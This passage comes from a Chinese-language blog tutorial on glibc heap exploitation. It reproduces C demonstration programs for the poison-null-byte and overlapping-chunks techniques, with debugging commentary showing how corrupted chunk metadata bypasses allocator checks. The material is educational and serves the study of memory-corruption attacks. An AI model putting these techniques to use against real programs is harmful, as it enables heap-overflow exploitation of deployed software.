class="built_in">printf</span>(<span class="string">&quot;We allocate 0x100 bytes for &#x27;a&#x27;.\n&quot;</span>);</span><br><span class="line">	a = (<span class="type">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;a: %p\n&quot;</span>, a);</span><br><span class="line">	<span class="type">int</span> real_a_size = <span class="built_in">malloc_usable_size</span>(a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Since we want to overflow &#x27;a&#x27;, we need to know the &#x27;real&#x27; size of &#x27;a&#x27; &quot;</span></span><br><span class="line">		<span class="string">&quot;(it may be more than 0x100 because of rounding): %#x\n&quot;</span>, real_a_size);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* chunk size attribute cannot have a least significant byte with a value of 0x00.</span></span><br><span class="line"><span class="comment">	 * the least significant byte of this will be 0x10, because the size of the chunk includes</span></span><br><span class="line"><span class="comment">	 * the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">	b = (<span class="type">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">	c = (<span class="type">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;c: %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">	barrier =  <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n&quot;</span></span><br><span class="line">		<span class="string">&quot;The barrier is not strictly necessary, but makes things less confusing\n&quot;</span>, barrier);</span><br><span class="line"></span><br><span class="line">	<span class="type">uint64_t</span>* b_size_ptr = (<span class="type">uint64_t</span>*)(b - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// added fix for size==prev_size(next_chunk) check in newer versions of glibc</span></span><br><span class="line">	<span class="comment">// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30</span></span><br><span class="line">	<span class="comment">// this added check requires we are allowed to have null pointers in b (not just a c string)</span></span><br><span class="line">	<span class="comment">//*(size_t*)(b+0x1f0) = 0x200;</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;In newer versions of glibc we will need to have our updated size inside b itself to pass &quot;</span></span><br><span class="line">		<span class="string">&quot;the check &#x27;chunksize(P) != prev_size (next_chunk(P))&#x27;\n&quot;</span>);</span><br><span class="line">	<span class="comment">// we set this location to 0x200 since 0x200 == (0x211 &amp; 0xff00)</span></span><br><span class="line">	<span class="comment">// which is the value of b.size after its first byte has been overwritten with a NULL byte</span></span><br><span class="line">	*(<span class="type">size_t</span>*)(b+<span class="number">0x1f0</span>) = <span class="number">0x200</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// this technique works by overwriting the size metadata of a free chunk</span></span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b.size is: (0x200 + 0x10) | prev_in_use\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\n&quot;</span>);</span><br><span class="line">	a[real_a_size] = <span class="number">0</span>; <span class="comment">// &lt;--- THIS IS THE &quot;EXPLOITED BUG&quot;</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="type">uint64_t</span>* c_prev_size_ptr = ((<span class="type">uint64_t</span>*)c)<span class="number">-2</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;c.prev_size is %#lx\n&quot;</span>,*c_prev_size_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// This malloc will result in a call to unlink on the chunk where b was.</span></span><br><span class="line">	<span class="comment">// The added check (commit id: 17f487b), if not properly handled as we did before,</span></span><br><span class="line">	<span class="comment">// will detect the heap corruption now.</span></span><br><span class="line">	<span class="comment">// The check is this: chunksize(P) != prev_size (next_chunk(P)) where</span></span><br><span class="line">	<span class="comment">// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)</span></span><br><span class="line">	<span class="comment">// next_chunk(P) == b-0x10+0x200 == b+0x1f0</span></span><br><span class="line">	<span class="comment">// prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n&quot;</span>,</span><br><span class="line">		*((<span class="type">size_t</span>*)(b<span class="number">-0x8</span>)), *(<span class="type">size_t</span>*)(b<span class="number">-0x10</span> + *((<span class="type">size_t</span>*)(b<span class="number">-0x8</span>))));</span><br><span class="line">	b1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b1: %p\n&quot;</span>,b1);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now we malloc &#x27;b1&#x27;. It will be placed where &#x27;b&#x27; was. &quot;</span></span><br><span class="line">		<span class="string">&quot;At this point c.prev_size should have been updated, but it was not: %#lx\n&quot;</span>,*c_prev_size_ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Interestingly, the updated value of c.prev_size has been written 0x10 bytes &quot;</span></span><br><span class="line">		<span class="string">&quot;before c.prev_size: %lx\n&quot;</span>,*(((<span class="type">uint64_t</span>*)c)<span class="number">-4</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We malloc &#x27;b2&#x27;, our &#x27;victim&#x27; chunk.\n&quot;</span>);</span><br><span class="line">	<span class="comment">// Typically b2 (the victim) will be a structure with valuable pointers that we want to control</span></span><br><span class="line"></span><br><span class="line">	b2 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b2: %p\n&quot;</span>,b2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(b2,<span class="string">&#x27;B&#x27;</span>,<span class="number">0x80</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Current b2 content:\n%s\n&quot;</span>,b2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now we free &#x27;b1&#x27; and &#x27;c&#x27;: this will consolidate the chunks &#x27;b1&#x27; and &#x27;c&#x27; (forgetting about &#x27;b2&#x27;).\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(b1);</span><br><span class="line">	<span class="built_in">free</span>(c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Finally, we allocate &#x27;d&#x27;, overlapping &#x27;b2&#x27;.\n&quot;</span>);</span><br><span class="line">	d = <span class="built_in">malloc</span>(<span class="number">0x300</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;d: %p\n&quot;</span>,d);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now &#x27;d&#x27; and &#x27;b2&#x27; overlap.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">memset</span>(d,<span class="string">&#x27;D&#x27;</span>,<span class="number">0x300</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;New b2 content:\n%s\n&quot;</span>,b2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks&quot;</span></span><br><span class="line">		<span class="string">&quot;for the clear explanation of this technique.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">assert</span>(<span class="built_in">strstr</span>(b2, <span class="string">&quot;DDDDDDDDDDDD&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>使用<code>glibc2.23</code>加参数<code>-g</code>编译并修改<code>rpath</code>。</p>
<h3 id="调试-7"><a href="#调试-7" class="headerlink" title="调试"></a>调试</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_U7NK7EPN83MV5VH.png"
                      alt="图片描述"
                ><br>申请了四个堆块,a(0x111),b(0x211),c(0x111),barrier(0x111)。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_DEP93F63ATZPHJZ.png"
                      alt="图片描述"
                ><br>因为我们要利用<code>off-by-null</code>把<code>chunkb</code>的<code>size</code>改为<code>0x200</code>，又因为是<code>chunkb</code>是<code>non-fast chunk</code>，将<code>b+0x1f0</code>的位置写为<code>0x200</code>绕过检查。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_2Y8ADDBXUQXUG4R.png"
                      alt="图片描述"
                ><br>接下来<code>free(b)</code>后，假设<code>a</code>存在<code>off-by-null</code>漏洞，将<code>chunkb</code>改为了<code>0x200</code>大小。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_C8GR9YZ8AVVR6YS.png"
                      alt="图片描述"
                ><br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_DMWG5SBG4MM3W5S.png"
                      alt="图片描述"
                ><br>然后申请两个堆块<code>b1_real_size : 0x110</code>,<code>b2_real_size : 0x90</code>，然后<code>free(b1)</code>来绕过<code>unlink</code>检查，再<code>free(c)</code>后，会向上寻找<code>0x210</code>大小的堆块，发现<code>b1</code>是一个已经释放的<code>chunk</code>，便会合并，此时我们再去申请<code>real_size == 0x110+0x210</code>的堆块时，便控制了中间所有的<code>chunk</code>。</p>
<h2 id="overlapping-chunks-1"><a href="#overlapping-chunks-1" class="headerlink" title="overlapping_chunks_1"></a>overlapping_chunks_1</h2><p><code>glibc &lt; 2.29</code></p>
<h3 id="源码-8"><a href="#源码-8" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> A simple tale of overlapping chunk.</span></span><br><span class="line"><span class="comment"> This technique is taken from</span></span><br><span class="line"><span class="comment"> http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc , <span class="type">char</span>* argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="type">intptr_t</span> *p1,*p2,*p3,*p4;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nThis is a simple chunks overlapping problem\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Let&#x27;s start to allocate 3 chunks on the heap\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">	p2 = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">	p3 = <span class="built_in">malloc</span>(<span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n&quot;</span>, p1, p2, p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(p1, <span class="string">&#x27;1&#x27;</span>, <span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">	<span class="built_in">memset</span>(p2, <span class="string">&#x27;2&#x27;</span>, <span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">	<span class="built_in">memset</span>(p3, <span class="string">&#x27;3&#x27;</span>, <span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nNow let&#x27;s free the chunk p2\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(p2);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now let&#x27;s simulate an overflow that can overwrite the size of the\nchunk freed p2.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;For a toy program, the value of the last 3 bits is unimportant;&quot;</span></span><br><span class="line">		<span class="string">&quot; however, it is best to maintain the stability of the heap.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse),&quot;</span></span><br><span class="line">		<span class="string">&quot; to assure that p1 is not mistaken for a free chunk.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> evil_chunk_size = <span class="number">0x181</span>;</span><br><span class="line">	<span class="type">int</span> evil_region_size = <span class="number">0x180</span> - <span class="number">8</span>;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n&quot;</span>,</span><br><span class="line">		 evil_chunk_size, evil_region_size);</span><br><span class="line"></span><br><span class="line">	*(p2<span class="number">-1</span>) = evil_chunk_size; <span class="comment">// we are overwriting the &quot;size&quot; field of chunk p2</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nNow let&#x27;s allocate another chunk with a size equal to the data\n&quot;</span></span><br><span class="line">	       <span class="string">&quot;size of the chunk p2 injected size\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This malloc will be served from the previously freed chunk that\n&quot;</span></span><br><span class="line">	       <span class="string">&quot;is parked in the unsorted bin which size has been modified by us\n&quot;</span>);</span><br><span class="line">	p4 = <span class="built_in">malloc</span>(evil_region_size);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\np4 has been allocated at %p and ends at %p\n&quot;</span>, (<span class="type">char</span> *)p4, (<span class="type">char</span> *)p4+evil_region_size);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;p3 starts at %p and ends at %p\n&quot;</span>, (<span class="type">char</span> *)p3, (<span class="type">char</span> *)p3+<span class="number">0x80</span><span class="number">-8</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;p4 should overlap with p3, in this case p4 includes all p3.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,&quot;</span></span><br><span class="line">		<span class="string">&quot; and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Let&#x27;s run through an example. Right now, we have:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="type">char</span> *)p4);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="type">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nIf we memset(p4, &#x27;4&#x27;, %d), we have:\n&quot;</span>, evil_region_size);</span><br><span class="line">	<span class="built_in">memset</span>(p4, <span class="string">&#x27;4&#x27;</span>, evil_region_size);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="type">char</span> *)p4);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="type">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nAnd if we then memset(p3, &#x27;3&#x27;, 80), we have:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">memset</span>(p3, <span class="string">&#x27;3&#x27;</span>, <span class="number">80</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="type">char</span> *)p4);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="type">char</span> *)p3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="调试-8"><a href="#调试-8" class="headerlink" title="调试"></a>调试</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_GHJ7RBMKB5Y8GMK.png"
                      alt="图片描述"
                ><br>首先申请三个堆块<code>p1_real:0x101</code>,<code>p2_real:0x101</code>,<code>p3_real:0x81</code>，这里只有申请<code>0x8</code>结尾的堆块才有下一个堆块<code>prev_size</code>的控制权，利用<code>off-by-one</code>漏洞。假设堆块<code>p1</code>读取时存在<code>off-by-one</code>。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_V7X588ARHBXTSY8.png"
                      alt="图片描述"
                ><br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_W3A27VBAJ34ECCK.png"
                      alt="图片描述"
                ><br><code>free(p2)</code>后，利用<code>p1</code>的<code>off-by-one</code>漏洞将<code>chunk_p2</code>的<code>size</code>改为<code>0x180</code>，再次申请<code>0x178</code>大小的堆块，即可得到<code>p3</code>的控制权。</p>
<h2 id="overlapping-chunks-2"><a href="#overlapping-chunks-2" class="headerlink" title="overlapping_chunks_2"></a>overlapping_chunks_2</h2><p><code>glibc &lt; 2.29</code></p>
<h3 id="源码-9"><a href="#源码-9" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> Yet another simple tale of overlapping chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> This technique is taken from</span></span><br><span class="line"><span class="comment"> https://loccs.sjtu.edu.cn/wiki/lib/exe/fetch.php?media=gossip:overview:ptmalloc_camera.pdf.</span></span><br><span class="line"><span class="comment"> This is also referenced as Nonadjacent Free Chunk Consolidation Attack.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">intptr_t</span> *p1,*p2,*p3,*p4,*p5,*p6;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;</span><br><span class="line">  <span class="type">int</span> prev_in_use = <span class="number">0x1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nThis is a simple chunks overlapping problem&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nThis is also referenced as Nonadjacent Free Chunk Consolidation Attack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nLet&#x27;s start to allocate 5 chunks on the heap:&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p1 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p2 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p3 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p4 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">  real_size_p1 = <span class="built_in">malloc_usable_size</span>(p1);</span><br><span class="line">  real_size_p2 = <span class="built_in">malloc_usable_size</span>(p2);</span><br><span class="line">  real_size_p3 = <span class="built_in">malloc_usable_size</span>(p3);</span><br><span class="line">  real_size_p4 = <span class="built_in">malloc_usable_size</span>(p4);</span><br><span class="line">  real_size_p5 = <span class="built_in">malloc_usable_size</span>(p5);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\n\nchunk p1 from %p to %p&quot;</span>, p1, (<span class="type">unsigned</span> <span class="type">char</span> *)p1+<span class="built_in">malloc_usable_size</span>(p1));</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nchunk p2 from %p to %p&quot;</span>, p2,  (<span class="type">unsigned</span> <span class="type">char</span> *)p2+<span class="built_in">malloc_usable_size</span>(p2));</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nchunk p3 from %p to %p&quot;</span>, p3,  (<span class="type">unsigned</span> <span class="type">char</span> *)p3+<span class="built_in">malloc_usable_size</span>(p3));</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nchunk p4 from %p to %p&quot;</span>, p4, (<span class="type">unsigned</span> <span class="type">char</span> *)p4+<span class="built_in">malloc_usable_size</span>(p4));</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nchunk p5 from %p to %p\n&quot;</span>, p5,  (<span class="type">unsigned</span> <span class="type">char</span> *)p5+<span class="built_in">malloc_usable_size</span>(p5));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(p1,<span class="string">&#x27;A&#x27;</span>,real_size_p1);</span><br><span class="line">  <span class="built_in">memset</span>(p2,<span class="string">&#x27;B&#x27;</span>,real_size_p2);</span><br><span class="line">  <span class="built_in">memset</span>(p3,<span class="string">&#x27;C&#x27;</span>,real_size_p3);</span><br><span class="line">  <span class="built_in">memset</span>(p4,<span class="string">&#x27;D&#x27;</span>,real_size_p4);</span><br><span class="line">  <span class="built_in">memset</span>(p5,<span class="string">&#x27;E&#x27;</span>,real_size_p5);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nLet&#x27;s free the chunk p4.\nIn this case this isn&#x27;t coealesced with top chunk since we have p5 bordering top chunk after p4\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p4);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nLet&#x27;s trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2\nwith the size of chunk_p2 + size of chunk_p3\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">int</span> *)((<span class="type">unsigned</span> <span class="type">char</span> *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + 